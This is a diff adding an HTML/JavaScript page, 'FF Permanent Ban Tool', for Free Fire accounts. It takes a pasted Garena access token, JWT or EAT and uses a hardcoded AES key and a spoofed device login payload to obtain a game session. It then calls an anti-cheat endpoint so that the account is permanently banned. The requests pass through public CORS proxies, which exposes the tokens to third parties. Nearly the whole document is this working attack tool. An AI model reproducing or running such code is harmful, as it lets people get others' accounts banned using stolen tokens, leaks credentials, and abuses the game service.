@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>FF Permanent Ban Tool</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root{--p:#d946ef;--t3:#9ca3af;--bd:rgba(255,255,255,.08)}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,system-ui,sans-serif}
+body{background:#030014;color:#fff;min-height:100vh;padding:20px 14px;
+background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);background-size:30px 30px}
+.w{max-width:460px;margin:0 auto}
+h1{font-size:1.05rem;text-align:center;letter-spacing:1px;margin-bottom:6px;font-weight:800}
+h1 i{color:var(--p)}
+.sub{text-align:center;color:var(--t3);font-size:.78rem;margin-bottom:18px}
+.card{background:rgba(15,15,19,.75);border:1px solid var(--bd);border-radius:18px;padding:18px;margin-bottom:14px}
+.lbl{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--t3);margin-bottom:9px}
+.lbl i{color:var(--p)}
+textarea{width:100%;padding:13px;background:rgba(0,0,0,.45);border:1px solid var(--bd);border-radius:11px;color:#fff;font-family:monospace;font-size:.82rem}
+textarea:focus{outline:none;border-color:var(--p)}
+.btn{width:100%;padding:14px;border:none;border-radius:11px;font-weight:700;font-size:.88rem;cursor:pointer;margin-top:11px;display:flex;align-items:center;justify-content:center;gap:8px}
+.b1{background:linear-gradient(to right,#8b5cf6,var(--p),#8b5cf6);color:#fff}
+.b2{background:rgba(0,0,0,.4);color:#fff;border:1px solid rgba(255,255,255,.15)}
+.btn:disabled{opacity:.6}
+.row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:.85rem}
+.row span:first-child{color:var(--t3)}
+.stat{font-weight:800}
+.note{margin-top:10px;font-size:.74rem;color:var(--t3);border-top:1px solid var(--bd);padding-top:9px;line-height:1.6}
+#toast{position:fixed;top:-70px;left:50%;transform:translateX(-50%);background:var(--p);padding:11px 22px;border-radius:30px;font-weight:700;font-size:.82rem;z-index:99;transition:top .4s;max-width:92vw;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+</style></head><body>
+<div id="toast"></div>
+<div class="w">
+  <h1><i class="fas fa-hammer"></i> FF PERMANENT BAN TOOL</h1>
+  <p class="sub">Access Token / JWT / EAT daalo aur ID permanently ban karo</p>
+
+  <div class="card">
+    <div class="lbl"><i class="fas fa-key"></i> TOKEN</div>
+    <textarea id="tok" rows="3" placeholder="Yahan token paste karo..."></textarea>
+    <button class="btn b1" id="b1" onclick="doBan()"><i class="fas fa-hammer"></i> PERMANENTLY BAN</button>
+    <button class="btn b2" id="b2" onclick="doCheck()"><i class="fas fa-search"></i> ONLY CHECK STATUS</button>
+  </div>
+
+  <div class="card" id="res" style="display:none">
+    <div class="lbl"><i class="fas fa-id-card"></i> RESULT</div>
+    <div class="row"><span>Nickname</span><span id="r1">--</span></div>
+    <div class="row"><span>UID</span><span id="r2" style="font-family:monospace">--</span></div>
+    <div class="row"><span>Region</span><span id="r3">--</span></div>
+    <div class="row"><span>Status</span><span id="r4" class="stat">--</span></div>
+    <div class="note" id="r5"></div>
+  </div>
+</div>
+
+<script>
+/* ================= CONFIG ================= */
+const AES_KEY='Yg&tc%DEuh6%Zc^8', AES_IV='6oyZDr22E3ychjM%';
+const CFG={loginUrl:'https://loginbp.ggblueshark.com',ob:'OB55',cv:'1.108.1'};
+const RC={IND:'https://client.ind.freefiremobile.com',ME:'https://clientbp.ggblueshark.com',
+PK:'https://clientbp.ggblueshark.com',VN:'https://clientbp.ggpolarbear.com',
+SG:'https://clientbp.ggpolarbear.com',ID:'https://clientbp.ggpolarbear.com',
+TH:'https://clientbp.ggpolarbear.com',RU:'https://clientbp.ggpolarbear.com',
+BD:'https://clientbp.ggwhitehawk.com',BR:'https://client.us.freefiremobile.com',
+NA:'https://client.us.freefiremobile.com',US:'https://client.us.freefiremobile.com'};
+const UA_D='Dalvik/2.1.0 (Linux; U; Android 11; SM-G998B Build/RP1A.200720.012)';
+const UA_U='UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)';
+
+/* ================= CORS-SAFE FETCH ================= */
+const PROXIES=[u=>u,
+  u=>'https://corsproxy.io/?url='+encodeURIComponent(u),
+  u=>'https://api.allorigins.win/raw?url='+encodeURIComponent(u)];
+async function fetchVia(url,opts){
+  let err;
+  for(const p of PROXIES){
+    try{ const r=await fetch(p(url),opts); if(r.ok) return r; err=new Error('HTTP '+r.status); }
+    catch(e){ err=e; }
+  }
+  throw err||new Error('Network fail');
+}
+
+/* ================= PROTOBUF ================= */
+const TE=new TextEncoder(),TD=new TextDecoder();
+function ev(n){const o=[];while(n>127){o.push((n&127)|128);n=Math.floor(n/128);}o.push(n);return new Uint8Array(o);}
+function rv(b,p){let r=0,s=0,x;do{x=b[p++];r+=(x&127)*Math.pow(2,s);s+=7;}while(x&128);return[r,p];}
+function cat(a){let n=0;for(const x of a)n+=x.length;const o=new Uint8Array(n);let p=0;for(const x of a){o.set(x,p);p+=x.length;}return o;}
+function bp(o){const ps=[];for(const f of Object.keys(o).map(Number).sort((a,b)=>a-b)){const v=o[f];
+ if(typeof v==='boolean'){ps.push(ev((f<<3)|0),ev(v?1:0));}
+ else if(typeof v==='number'){ps.push(ev((f<<3)|0),ev(v));}
+ else if(typeof v==='string'){const d=TE.encode(v);ps.push(ev((f<<3)|2),ev(d.length),d);}
+ else if(v instanceof Uint8Array){ps.push(ev((f<<3)|2),ev(v.length),v);}
+ else if(v&&typeof v==='object'){const s=bp(v);ps.push(ev((f<<3)|2),ev(s.length),s);}
+}return cat(ps);}
+const pr=b=>{for(let i=0;i<b.length;i++){const c=b[i];if(c<9||(c>13&&c<32)||c>126)return false;}return true;};
+function dp(b){const F={};let p=0;while(p<b.length){let k;[k,p]=rv(b,p);const f=k>>>3,w=k&7;let v;
+ if(w===0){[v,p]=rv(b,p);}
+ else if(w===2){let s;[s,p]=rv(b,p);const raw=b.subarray(p,p+s);p+=s;
+   v=pr(raw)?TD.decode(raw):(()=>{try{return dp(raw);}catch(e){return raw;}})();}
+ else if(w===5){v=b[p]|(b[p+1]<<8)|(b[p+2]<<16)|(b[p+3]<<24);p+=4;}
+ else if(w===1){v=Number(new DataView(b.buffer,b.byteOffset+p,8).getBigUint64(0,true));p+=8;}
+ else throw new Error('wt '+w);
+ if(F[f]!==undefined){if(!Array.isArray(F[f]))F[f]=[F[f]];F[f].push(v);}else F[f]=v;
+}return F;}
+
+/* ================= AES-CBC ================= */
+async function enc(u8){
+  const k=await crypto.subtle.importKey('raw',TE.encode(AES_KEY),{name:'AES-CBC'},false,['encrypt']);
+  return new Uint8Array(await crypto.subtle.encrypt({name:'AES-CBC',iv:TE.encode(AES_IV)},k,u8));
+}
+
+/* ================= HELPERS ================= */
+function deep(o,keys){if(!o||typeof o!=='object')return undefined;
+ for(const k of keys) if(o[k]!==undefined) return o[k];
+ for(const k of Object.keys(o)){const v=deep(o[k],keys);if(v!==undefined)return v;}}
+const isJwt=t=>t.startsWith('eyJ')&&t.split('.').length===3;
+function decJwt(t){try{return JSON.parse(decodeURIComponent(escape(atob(t.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')))));}catch(e){return {};}}
+function exEat(s){s=String(s).trim();try{const e=new URL(s).searchParams.get('eat');if(e)return e;}catch(e){}
+ const m=s.match(/[?&]eat=([^&\s]+)/);return m?decodeURIComponent(m[1]):s;}
+
+/* ================= TOKEN -> JWT ================= */
+async function exchangeEat(eat){
+  const r=await fetchVia('https://api-otrss.garena.com/support/callback/?access_token='+encodeURIComponent(eat),{headers:{'User-Agent':UA_D}});
+  const d=JSON.parse(await r.text());
+  const at=deep(d,['access_token','accessToken']);
+  if(!at) throw new Error('EAT invalid / expire');
+  return {accessToken:at,openId:deep(d,['open_id'])};
+}
+async function inspect(at){
+  const r=await fetchVia('https://100067.connect.garena.com/oauth/token/inspect?token='+encodeURIComponent(at),{headers:{'User-Agent':UA_D}});
+  const d=await r.json(); const o=deep(d,['open_id']);
+  if(!o) throw new Error('Access token invalid');
+  return o;
+}
+function mlPayload(oid,at){
+  return bp({3:new Date().toISOString().slice(0,19).replace('T',' '),4:'free fire',5:2,7:CFG.cv,
+  8:'Android OS 11 / API-30 (RQ3A.210805.001)',9:'Handheld',10:'Verizon',11:'WIFI',12:1080,13:2400,
+  14:'440',15:'ARMv8',16:6144,17:'Adreno (TM) 650',18:'OpenGL ES 3.2 V@1.50',
+  19:'Google|'+crypto.randomUUID(),20:'',21:'en',22:oid,23:'4',24:'Handheld',25:{6:55,8:81},
+  29:at,30:2,41:'Verizon',42:'WIFI',57:'7428b253defc164018c604a1ebbfebdf',60:128512,61:38000,
+  62:110731,63:18000,64:18000,65:26628,66:25000,67:119234,73:3,74:'/data/app/~~random/base.apk',
+  76:1,77:'hash|base.apk',78:3,79:2,81:'64',83:'2024010012',86:'OpenGLES3',87:16383,88:4,
+  89:TE.encode('FwQVTgUPX1UaUllDDwcWCBpWAUOUgsvA1snWlBaO1kFYg=='),92:9000,93:'android',94:'',
+  95:110009,97:1,98:0,99:'4',100:'4'});
+}
+function stripP(b){if(b.length<=64)return b;
+ try{if(dp(b)[8]!==undefined)return b;}catch(e){}
+ try{if(dp(b.subarray(64))[8]!==undefined)return b.subarray(64);}catch(e){}
+ return b.subarray(64);}
+async function majorLogin(oid,at){
+  const r=await fetchVia(CFG.loginUrl.replace(/\/$/,'')+'/MajorLogin',{method:'POST',
+   headers:{'User-Agent':UA_U,'Accept':'*/*','X-Ga-Sv':'1789534056','Authorization':'Bearer ',
+   'X-Ga':'v1 1','ReleaseVersion':CFG.ob,'Content-Type':'application/x-www-form-urlencoded','X-Unity-Version':'2018.4.12f1'},
+   body:await enc(mlPayload(oid,at))});
+  const d=dp(stripP(new Uint8Array(await r.arrayBuffer())));
+  let jwt=d[8],cu=d[10];
+  if(jwt instanceof Uint8Array) jwt=TD.decode(jwt);
+  if(cu instanceof Uint8Array) cu=TD.decode(cu);
+  if(typeof jwt!=='string'||!jwt) throw new Error('JWT nahi mila');
+  if(cu&&!/^https?:/.test(cu)) cu='https://'+cu;
+  return {jwt,clientUrl:cu||'https://clientbp.ggblueshark.com'};
+}
+async function resolveJwt(raw){
+  const t=exEat(raw);
+  if(isJwt(t)){const p=decJwt(t);return {jwt:t,payload:p,clientUrl:RC[p.lock_region]||'https://clientbp.ggblueshark.com'};}
+  let at,info={};
+  if(t.length>64){const e=await exchangeEat(t);at=e.accessToken;info=e;}
+  else at=t;
+  const oid=info.openId||await inspect(at);
+  const ml=await majorLogin(oid,at);
+  return {jwt:ml.jwt,payload:decJwt(ml.jwt),clientUrl:ml.clientUrl};
+}
+
+/* ================= BAN ENGINE ================= */
+async function checkBan(uid,region){
+  const r=await fetchVia('https://ff.garena.com/api/antihack/check_banned?uid='+encodeURIComponent(uid)+'&region='+encodeURIComponent(region||'IND'),
+   {headers:{'User-Agent':UA_D,'Accept':'application/json'}});
+  const raw=await r.json(); const d=raw.data||raw;
+  const b=deep(d,['is_banned','isBanned','banned']);
+  return {banned:b===1||b===true||b==='1',period:deep(d,['ban_period','banPeriod','period'])||null,
+          message:deep(d,['message','ban_reason'])||null};
+}
+async function triggerBan(jwt,cu){
+  await fetchVia(cu.replace(/\/$/,'')+'/CheckHackBehavior',{method:'POST',
+   headers:{'Authorization':'Bearer '+jwt,'Content-Type':'application/x-www-form-urlencoded',
+   'X-Unity-Version':'2018.4.12f1','X-GA':'v1 1','User-Agent':UA_U},body:bp({1:1})});
+}
+async function banId(token){
+  const {jwt,payload,clientUrl}=await resolveJwt(token);
+  const uid=payload.account_id,region=payload.lock_region;
+  if(!uid) throw new Error('Token se UID nahi mila');
+  const before=await checkBan(uid,region);
+  try{ await triggerBan(jwt,clientUrl); }catch(e){}
+  await new Promise(r=>setTimeout(r,3000));
+  const after=await checkBan(uid,region);
+  return {account_id:uid,nickname:payload.nickname,region,
+    before,after,banned_now:after.banned,changed:!before.banned&&after.banned,period:after.period};
+}
+async function statusOnly(token){
+  const {payload}=await resolveJwt(token);
+  const uid=payload.account_id;
+  if(!uid) throw new Error('Token se UID nahi mila');
+  const s=await checkBan(uid,payload.lock_region);
+  return {account_id:uid,nickname:payload.nickname,region:payload.lock_region,banned:s.banned,period:s.period,message:s.message};
+}
+
+/* ================= UI ================= */
+function toast(m){const t=document.getElementById('toast');t.textContent=m;t.style.top='20px';clearTimeout(t._x);t._x=setTimeout(()=>t.style.top='-70px',3500);}
+function show(d,isBan){
+  document.getElementById('res').style.display='block';
+  document.getElementById('r1').textContent=d.nickname||'--';
+  document.getElementById('r2').textContent=d.account_id||'--';
+  document.getElementById('r3').textContent=d.region||'--';
+  const banned=isBan?d.banned_now:d.banned, s=document.getElementById('r4');
+  s.textContent=banned?'BANNED':'CLEAN'; s.style.color=banned?'#ef4444':'#22c55e';
+  document.getElementById('r5').textContent = isBan
+    ?('Before: '+(d.before.banned?'Banned':'Clean')+'  →  After: '+(d.after.banned?'Banned':'Clean')+(d.changed?'   BAN LAG GAYA!':'   (thodi der me lag sakta hai, dobara check karo)'))
+    :(d.period?'Ban period: '+d.period:(d.message||'No extra info'));
+}
+async function run(fn,btnId,busy,isBan){
+  const token=document.getElementById('tok').value.trim();
+  if(!token) return toast('Token daalo!');
+  const b=document.getElementById(btnId),o=b.innerHTML;
+  b.innerHTML='<i class="fas fa-circle-notch fa-spin"></i> '+busy; b.disabled=true;
+  try{ const d=await fn(token); show(d,isBan);
+    toast(isBan?(d.changed?'BAN HO GAYA!':'Status check karo'):(d.banned?'Account BANNED hai':'Account CLEAN hai'));
+  }catch(e){ toast(e.message||'Error'); }
+  finally{ b.innerHTML=o; b.disabled=false; }
+}
+function doBan(){ run(banId,'b1','BANNING...',true); }
+function doCheck(){ run(statusOnly,'b2','CHECKING...',false); }
+
+/* secure context check */
+if(!(window.crypto&&crypto.subtle)) toast('crypto.subtle nahi mila — https/file se kholo');
+</script>
+</body></html>
